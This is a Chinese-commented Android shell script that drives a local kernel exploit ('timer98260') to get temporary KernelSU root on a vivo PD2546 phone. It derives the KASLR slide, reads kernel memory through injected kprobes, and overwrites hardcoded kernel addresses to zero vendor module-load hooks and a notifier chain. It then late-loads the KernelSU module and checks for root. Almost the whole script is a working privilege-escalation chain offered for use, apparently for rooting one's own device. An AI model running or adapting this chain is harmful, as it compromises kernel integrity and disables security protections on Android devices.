#!/system/bin/sh
# PD2546 临时 KernelSU root —— 设备本机版
# 用法（目标机上，通过 Shizuku 的 rish 拿到 uid=2000 shell）：
#   rish
#   sh /data/local/tmp/reroot-local.sh
#
# 与 adb 版的差别：重启会把这个脚本本身一起杀掉，所以 exploit parked 时
# 必须你手动重启后再跑一次，没法像电脑那样自动重试 8 轮。

D=${PD_D:-/data/local/tmp}
CH="$D/chan"
LOG="$D/fakeR.log"
HERE=$(dirname "$0")
SRC=${PD_SRC:-}
if [ -z "$SRC" ]; then
  for _c in /sdcard/Download/pd2546/files "$HERE/files"; do
    [ -d "$_c" ] && { SRC=$_c; break; }
  done
fi
[ -n "$SRC" ] || SRC=/sdcard/Download/pd2546/files

IMAGE_BASE=ffffffc080000000
KPROBE_TABLE=ffffffc08279f6e8
LOAD_MODULE=ffffffc080502688
MODULE_NOTIFY_LIST=ffffffc0825d7d28
TRACE_MODULE_NOTIFY=ffffffc08057d2a4
TRACE_SYS_EXIT=ffffffc0826d93e0

say() { echo "$*"; }
die() { echo "[X] $*"; exit 2; }

# ---------- 32 位分半的十六进制运算（全内建，不 fork） ----------
HEXD=0123456789abcdef
hex8() { # $1=0..4294967295 -> HOUT
  _v=$1; _s=''; _i=8
  while [ $_i -gt 0 ]; do
    _s="${HEXD:$((_v & 15)):1}$_s"
    _v=$((_v >> 4))
    _i=$((_i - 1))
  done
  HOUT=$_s
}
hadd() { # $1=16位hex  $2=十进制增量 -> HOUT
  _a=$1; _d=$2
  _al=$((0x${_a#????????})); _ah=$((0x${_a%????????}))
  _nl=$((_al + _d)); _nh=$_ah
  while [ $_nl -ge 4294967296 ]; do _nl=$((_nl - 4294967296)); _nh=$((_nh + 1)); done
  while [ $_nl -lt 0 ]; do _nl=$((_nl + 4294967296)); _nh=$((_nh - 1)); done
  _nh=$((_nh & 4294967295))
  hex8 $_nh; _h=$HOUT
  hex8 $_nl; _l=$HOUT
  HOUT="$_h$_l"
}
hlt() { # $1 < $2 ?（两个 16 位 hex）
  _xh=$((0x${1%????????})); _yh=$((0x${2%????????}))
  [ $_xh -lt $_yh ] && return 0
  [ $_xh -gt $_yh ] && return 1
  [ $((0x${1#????????})) -lt $((0x${2#????????})) ]
}

# ---------- chan 通道 ----------
write_run() { # stdin -> chan/run（先写 .new 再 rename，避免 dispatcher 读到半截）
  cat > "$CH/run.new"
  mv -f "$CH/run.new" "$CH/run"
}

kread() { # 地址... -> KV0 KV1 ...（hex，不带 0x；读不到为空）
  _n=$#; _i=0; _args=''
  for _a in "$@"; do _args="$_args a$_i=@0x$_a"; _i=$((_i + 1)); done
  KRCNT=$((KRCNT + 1)); _ev="kr$$_$KRCNT"; _dm="__KR_${_ev}__"
  _i=0
  while [ $_i -lt $_n ]; do eval "KV$_i=''"; _i=$((_i + 1)); done
  {
    echo 'cd /sys/kernel/tracing'
    echo 'echo 0 > events/enable'
    echo 'echo > kprobe_events'
    echo "echo 'p:$_ev capable$_args' >> kprobe_events"
    echo 'echo 1 > events/kprobes/enable 2>&1'
    echo 'echo 1 > tracing_on'
    echo 'echo > trace'
    echo "$D/probe > /dev/null 2>&1"
    echo 'sleep 1'
    echo 'echo 0 > tracing_on'
    echo "grep '$_ev:' trace | tail -1"
    echo 'echo 0 > events/kprobes/enable 2>/dev/null'
    echo "echo $_dm"
  } | write_run
  _w=0
  while [ $_w -lt 75 ]; do
    sleep 2; _w=$((_w + 1))
    grep -aq "$_dm" "$LOG" && break
  done
  _line=$(grep -a "$_ev:" "$LOG" | tail -1)
  [ -n "$_line" ] || return 1
  for _t in $_line; do
    case "$_t" in
      a[0-9]*=0x*) _k=${_t%%=*}; _k=${_k#a}; eval "KV$_k=\${_t#*=0x}" ;;
    esac
  done
  return 0
}

plant() { # $1=地址 $2=模式(默认0)
  _addr=$1; _mode=${2:-0}; _p=0
  while [ $_p -lt 6 ]; do
    _p=$((_p + 1))
    rm -f "$CH/plant_res" "$CH/plant_done"
    printf '%s %s\n' "$_addr" "$_mode" > "$CH/plant_req"
    _w=0
    while [ $_w -lt 90 ]; do
      sleep 2; _w=$((_w + 1))
      [ -s "$CH/plant_res" ] && break
    done
    _res=$(cat "$CH/plant_res" 2>/dev/null)
    say "  [plant] $_addr #$_p -> ${_res:-timeout}"
    case "$_res" in 1*) return 0 ;; esac
  done
  return 1
}

zero_check() { # $1=标签
  case "${KV0:-}" in ''|0) return 0 ;; esac
  die "$1 没清掉（读到 $KV0）"
}

# ---------- 0. 环境 ----------
say "[1/7] 环境检查"
say "  id=$(id)"
[ "$(id -u)" = "2000" ] || say "[!] 不是 uid=2000，请确认在 rish 里运行"

# PD_PKG：管理器包名（App 里选的根管理器），PD_KMI：late-load 的 KMI 串
PKG=${PD_PKG:-me.weishu.kernelsu}
KMI=${PD_KMI:-android16-6.12}

KEXP='6.12.58-android16-6-gdd6fd5c98918'
KV=$(uname -r)
say "  kernel=$KV"
case "$KV" in
  *"$KEXP"*) ;;
  *)
    say "[!] 内核 $KV 与包内常量（$KEXP）不一致。"
    say "    地址/符号全按那个 build 推导，错 build 写下去不是 root 是 panic。"
    [ "${FORCE:-0}" = "1" ] || die "确认要硬来: FORCE=1 sh $0"
    say "[!] FORCE=1，继续但风险自负"
    ;;
esac

for f in timer98260 ksud probe fake_shell.sh symbols.txt; do
  if [ ! -f "$D/$f" ]; then
    [ -f "$SRC/$f" ] || die "缺少 $SRC/$f（先把解压出来的 linux/files 放到 /sdcard/Download/pd2546/）"
    cp -f "$SRC/$f" "$D/$f" || die "拷贝 $f 失败"
  fi
done
chmod 755 "$D/timer98260" "$D/ksud" "$D/probe" "$D/fake_shell.sh"
mkdir -p "$CH"; chmod 777 "$CH"
printf 1 > "$CH/kptr_0000"; chmod 666 "$CH/kptr_0000"
rm -f "$CH/plant_req" "$CH/plant_done" "$CH/plant_res" "$CH/run" "$CH/run.new" "$CH/busy"

if ps -A -o PID,NAME 2>/dev/null | grep -q '[t]imer98260'; then
  say "[X] 已有 timer98260 在跑。先重启手机再跑本脚本，否则释放 fake 页会 panic。"
  exit 2
fi

# ---------- 1. 起 exploit ----------
say "[2/7] 启动 fake exploit（setsid 脱离当前 shell）"
cd "$D" || die "进不去 $D"
rm -f "$LOG"
setsid sh -c 'nohup ./timer98260 fake > fakeR.log 2>&1 < /dev/null &' 2>/dev/null \
  || { nohup ./timer98260 fake > fakeR.log 2>&1 < /dev/null & }

ready=0; parked=0; _w=0
while [ $_w -lt 60 ]; do
  sleep 3; _w=$((_w + 1))
  if grep -aq 'plant server ready' "$LOG"; then ready=1; break; fi
  if grep -aq 'parking without reap' "$LOG"; then parked=1; break; fi
done
if [ "$ready" != "1" ]; then
  say "[X] 这一轮没成功（parked=$parked），重启手机后再跑一次。"
  tail -5 "$LOG" 2>/dev/null
  exit 1
fi
SLIDE=$(grep -o 'slide=0x[0-9a-f]*' "$LOG" | head -1 | sed 's/.*0x//')
[ -n "$SLIDE" ] || die "日志里没有 slide"
SLIDE_DEC=$((0x$SLIDE))
say "  READY slide=0x$SLIDE"

hadd "$IMAGE_BASE" "$SLIDE_DEC"; BASE="$HOUT"
hadd "$BASE" 50331648; LIMIT="$HOUT"

# ---------- 2. vr funcs ----------
say "[3/7] 清 vr funcs"
hadd "$TRACE_SYS_EXIT" "$SLIDE_DEC"
hadd "$HOUT" 72; VR="$HOUT"
plant "$VR" 0 || die "VR PLANT FAILED"
kread "$VR"; zero_check "vr funcs"
say "  vr funcs after = ${KV0:-none}"

# ---------- 3. kprobe 聚合节点 / pre_handler ----------
say "[4/7] 扫 kprobe 桶，找聚合节点"
hadd "$LOAD_MODULE" "$SLIDE_DEC"; LM="$HOUT"
hadd "$KPROBE_TABLE" "$SLIDE_DEC"; TB="$HOUT"
say "  lm=$LM"

CANDS=''
_b=0
while [ $_b -lt 64 ]; do
  _addrs=''; _j=0
  while [ $_j -lt 16 ]; do
    hadd "$TB" $(( (_b + _j) * 8 )); _addrs="$_addrs $HOUT"
    _j=$((_j + 1))
  done
  kread $_addrs
  _j=0
  while [ $_j -lt 16 ]; do
    eval "_h=\${KV$_j:-}"
    case "$_h" in ffffff*) CANDS="$CANDS $_h" ;; esac
    _j=$((_j + 1))
  done
  _b=$((_b + 16))
done
say "  桶内有效指针 $(echo $CANDS | wc -w) 个"

AGGR=''
for _c in $CANDS; do
  hadd "$_c" 40; _ap="$HOUT"
  kread "$_ap"
  [ "${KV0:-}" = "$LM" ] && { AGGR=$_c; break; }
done
[ -n "$AGGR" ] || die "AGGR NOT FOUND（slide 或 KPROBE_TABLE 不对）"
say "  aggr=$AGGR"

hadd "$AGGR" 16; _head="$HOUT"
kread "$_head"; NODE=${KV0:-}
TARGET=''; _i=0
while [ $_i -lt 8 ] && [ -n "$NODE" ] && [ "$NODE" != "$_head" ]; do
  hadd "$NODE" 24; _an="$HOUT"
  hadd "$NODE" 48; _ap="$HOUT"
  kread "$NODE" "$_an" "$_ap"
  NN=${KV0:-}; _addr=${KV1:-}; _pre=${KV2:-}
  say "  node=$NODE addr=$_addr pre=$_pre"
  if [ "$_addr" = "$LM" ] && [ -n "$_pre" ]; then
    if hlt "$_pre" "$BASE" || ! hlt "$_pre" "$LIMIT"; then
      TARGET=$_ap
    fi
  fi
  [ -n "$TARGET" ] && break
  NODE=$NN
  _i=$((_i + 1))
done
if [ -z "$TARGET" ]; then
  if [ "${TOLERANT:-0}" = "1" ]; then
    say "  [!] PRE_HANDLER NOT FOUND，TOLERANT=1 跳过（非 vivo 机型通常没有这个节点）"
  else
    die "PRE_HANDLER NOT FOUND（非 vivo 机型可试 TOLERANT=1）"
  fi
else
  plant "$TARGET" 0 || die "PRE PLANT FAILED"
  kread "$TARGET"; zero_check "pre_handler"
  say "  pre_handler after = ${KV0:-none}"
fi

# ---------- 4. notifier 链 ----------
say "[5/7] 截断 module notifier 链"
hadd "$MODULE_NOTIFY_LIST" "$SLIDE_DEC"; NH="$HOUT"
hadd "$NH" 64; kread "$HOUT"; NODE=${KV0:-}
say "  notifier head $NODE"
hadd "$TRACE_MODULE_NOTIFY" "$SLIDE_DEC"; WANT="$HOUT"
NT=''; _i=0
while [ $_i -lt 16 ] && [ -n "$NODE" ]; do
  hadd "$NODE" 8; _nn_a="$HOUT"
  hadd "$NODE" 16; _pr_a="$HOUT"
  kread "$NODE" "$_nn_a" "$_pr_a"
  CALL=${KV0:-}; NN=${KV1:-}
  say "  nb $NODE call=$CALL next=$NN"
  [ "$CALL" = "$WANT" ] && { NT=$_nn_a; break; }
  NODE=$NN
  _i=$((_i + 1))
done
if [ -z "$NT" ]; then
  if [ "${TOLERANT:-0}" = "1" ]; then
    say "  [!] TRACE_MODULE_NOTIFY NODE NOT FOUND，TOLERANT=1 跳过"
  else
    die "TRACE_MODULE_NOTIFY NODE NOT FOUND（可试 TOLERANT=1）"
  fi
else
  plant "$NT" 0 || die "NOTIFIER PLANT FAILED"
  kread "$NT"; zero_check "notifier"
  say "  notifier next after = ${KV0:-none}"
fi
say "  ALL PLANTS OK"

# ---------- 5. kallsyms ----------
say "[6/7] 生成 kallsyms（128943 行，几十秒）"
while read -r _a _t _n; do
  [ -z "$_a" ] && continue
  hadd "$_a" "$SLIDE_DEC"
  echo "$HOUT $_t $_n"
done < "$D/symbols.txt" > "$D/kall"
say "  KALLSYMS_OK $(wc -l < "$D/kall" | tr -d ' ')"

# ---------- 6. late-load ----------
say "[7/7] ksud late-load"
{
  echo 'echo ===LOAD==='
  echo 'id'
  echo 'cat /sys/module/module/parameters/sig_enforce'
  echo 'mkdir -p /data/adb'
  echo "cp $D/kall /data/adb/kall"
  echo 'chmod 644 /data/adb/kall'
  echo "$D/ksud late-load --kmi $KMI --allow-shell --package-name $PKG"
  echo 'echo LATE_RC=$?'
  echo 'sleep 2'
  echo 'grep kernelsu /proc/modules'
  echo 'echo ===LOAD_END==='
} | write_run
_w=0
while [ $_w -lt 40 ]; do
  sleep 3; _w=$((_w + 1))
  grep -aq '===LOAD_END===' "$LOG" && break
done
sleep 2

say ''
say "=== 验证 ==="
grep -a 'LATE_RC' "$LOG" | tail -1
grep -a 'kernelsu' "$LOG" | tail -1
OUT=$(grep kernelsu /proc/modules 2>/dev/null; su -c id 2>&1 | head -1; getenforce 2>/dev/null)
echo "$OUT"
case "$OUT" in
  *kernelsu*u:r:ksu:s0*)
    say ''
    say '========================================'
    say '  KSU_ROOT_OK  root 已就绪（u:r:ksu:s0）'
    say '========================================'
    exit 0 ;;
esac
say "[X] 验证没通过。确认管理器 $PKG 已安装且与 ksud 版本一致，再重跑。"
exit 1
